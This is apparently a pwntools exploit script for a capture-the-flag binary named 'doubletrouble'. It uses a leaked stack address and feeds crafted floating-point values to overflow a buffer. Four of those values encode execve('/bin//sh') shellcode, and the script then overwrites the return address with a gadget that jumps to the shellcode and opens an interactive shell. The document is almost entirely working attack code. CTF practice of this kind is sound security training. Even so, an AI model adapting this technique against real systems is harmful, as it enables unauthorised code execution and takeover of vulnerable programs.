from pwn import *

def hex2num(hex_str):
    if len(hex_str) != 16:
        raise ValueError("Hex string must be exactly 16 hex digits for a double.")

    b = bytes.fromhex(hex_str)
    num = struct.unpack('!d', b)[0]
    return num

gdbcmds = '''
b *(game+505)
b *(game+562)
r
'''
elf = context.binary = ELF('./doubletrouble')
#proc = gdb.debug('./doubletrouble', gdbscript=gdbcmds)
proc = process("./doubletrouble")

buffer_addr = proc.recvline();
buffer_addr = int(buffer_addr.strip(), 16) + 0x1d8
print("SHELL CODE: ", hex(buffer_addr))
print("LEAK: ", hex(buffer_addr-0x1d8))

proc.recvuntil(b":")
proc.sendline(b"64")

for i in range(5):
    proc.recvuntil(b":")
    proc.sendline(b"-1e300")
proc.recvuntil(b":")
proc.sendline(b"-20")


for i in range(51):
    proc.recvuntil(b":")
    proc.sendline(b"-1e300")
    
''' shell code '''
s1 = b"-9.455235083177544e-227"# 0x9101eb51e1f7c931
s2 = b"-6.8282747051424842e-229"# 0x90909068732f2f68 
s3 = b"-6.6994892300412978e-229"# 0x9090406e69622f68
s4 = b"-1.3287388429188698e-231"# 0x900080cd0bb0e389
proc.recvuntil(b":")
proc.sendline(s1)
proc.recvuntil(b":")
proc.sendline(s2)
proc.recvuntil(b":")
proc.sendline(s3)
proc.recvuntil(b":")
proc.sendline(s4)

proc.recvuntil(b":")
send_int = str(hex2num("0800000000000000")).encode('utf-8')
proc.sendline(send_int)

proc.recvuntil(b":")
send_int = str(hex2num("0804900a0804900a")).encode('utf-8')
proc.sendline(send_int)

proc.recvuntil(b":")
ret_gadget = hex2num("0804900a"+hex(buffer_addr)[2:])
ret_gadget = str(ret_gadget).encode('utf-8')
proc.sendline(ret_gadget)

proc.interactive()
